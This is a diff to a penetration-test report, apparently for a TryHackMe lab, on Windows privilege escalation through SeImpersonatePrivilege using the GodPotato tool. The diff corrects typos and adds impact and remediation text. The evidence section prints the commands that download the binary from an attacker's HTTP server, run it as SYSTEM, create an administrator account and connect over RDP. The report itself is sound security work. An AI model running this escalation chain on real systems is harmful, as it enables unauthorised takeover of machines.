@@ -59,16 +59,16 @@ The server-side upload handling must validate and restrict uploads (validate MIM
 CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:H/SA:N  
 
 **CVSS Justification:**  
-A low-privileged local account (`evader`) could leverage the granted `SeImpersonatePrivilege` to impersonate a SYSTEM token and execute processes as `NT AUTHORITY\SYSTEM`. This allowed creation of an administrative user and full system-level access. The attack requires local access (AV:L) but is low in complexity to perform (AC:L) when the privilege is present, and yields sever confidentiality/integrity impact.  
+A low-privileged local account (`evader`) could leverage the granted `SeImpersonatePrivilege` to impersonate a SYSTEM token and execute processes as `NT AUTHORITY\SYSTEM`. This allowed the creation of an administrative user and full system-level access. The attack requires local access (AV:L) but is low in complexity to perform (AC:L) when the privilege is present, and yields severe confidentiality and integrity impact.  
 
 **Summary:**  
-The `evader` user had `SeImpersonatePrivilege`, which was abused using a public exploit (GodPotato) to obtain `NT AUTHORITY\SYSTEM` execution context. This context was used to create a new administrative user (`tester`) which then allowed RDP access and gull GUI administrative control.  
+The `evader` user had `SeImpersonatePrivilege`, which was abused using a public exploit (GodPotato) to obtain `NT AUTHORITY\SYSTEM` execution context. This context was used to create a new administrative user (`tester`) which then allowed RDP access and full GUI administrative control.  
 
 **Background:**  
 Windows systems with `SeImpersonatePrivilege` (or similar impersonation rights) are susceptible to token impersonation techniques (various "Potato" families). The target permitted local abuse of this privilege. This allows attackers to perform actions on the target system with the privilege of `NT AUTHORITY\SYSTEM`.  
 
 **Technical details & Evidence:**  
-Local privilege escalation was achieved using GodPotato which has been listed in the appendices.  
+Local privilege escalation was achieved using GodPotato, which is listed in the appendices.  
 
 The first step was to transfer the GodPotato binary to the target machine via an attacker-controlled HTTP server.
 ```bash
@@ -79,7 +79,7 @@ Serving HTTP on 0.0.0.0 port 5050 (http://0.0.0.0:5050/) ...
 ```powershell
 evader@HostEvasion:C:\xampp\htdocs# powershell wget http://10.4.12.97:5050/potato.exe -outfile potato.exe
 ```
-Once the binary was transferred to the target host the `/whoami` command was executed to validate `SYSTEM` execution:
+Once the binary was transferred to the target host the `whoami` command was executed to validate `SYSTEM` execution:
 ```powershell
 evader@HostEvasion:C:\xampp\htdocs# .\potato.exe -cmd "cmd /c whoami"
 Removed for brevity
@@ -115,7 +115,9 @@ Administrator            DefaultAccount           evader
 Guest                    tester                   WDAGUtilityAccount
 The command completed successfully.
 ```
-The newly created `tester` user was then granted access to the `administrators` group:
+The output above confirms the new user `tester` exists.  
+
+The newly created `tester` user was then granted access to the `Administrators` group:
 ```powershell
 evader@HostEvasion:C:\xampp\htdocs# .\potato.exe -cmd "net localgroup administrators tester /add"
 Removed for brevity
@@ -140,18 +142,21 @@ Administrator
 tester
 The command completed successfully.
 ```
-With the `tester` account in the Administrators group, RDP into the hose was achieved:
+The output above confirms `tester` is a member of Administrators.  
+
+With the `tester` account in the Administrators group, RDP into the host was achieved:
 ```bash
-xfreerdp3 /v:HostEvasion /u:tester /p:REDACTED
+xfreerdp3 /v:HostEvasion /u:tester /p:[password redacted]
 ```  
 ![RDP - start.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Stealth/Images/RDP%20-%20start.png)  
 
-The `tester` session was used to accept UAC and retrieve sensitive data from the target system.
+The `tester` session was used to accept the UAC prompt and retrieve sensitive data from the target system.
 
+**Impact:**  
+A local attacker with the `SeImpersonatePrivilege` can escalate to `SYSTEM`, create or modify privileged accounts, install persistent backdoors, disable security controls, access all system files and credentials, and fully compromise the host and likely the domain if additional misconfigurations exist.  
 
-**Impact:** 
-
-**Remediation Advice:** 
+**Remediation Advice:**  
+Remove unnecessary privileges from service accounts and user groups; specifically, revoke `SeImpersonatePrivilege` from accounts that do not require it. Apply the principle of least privilege across services, web and service accounts must not have rights that facilitate token impersonation. Apply vendor patches and harden the system to reduce token-impersonation risk. Implement application control (process whitelisting) to limit execution of arbitrary binaries. Monitor anomalous creation of accounts, additions to the Administrators group and token-impersonation activity.
 
 ---
 ## Appendices  
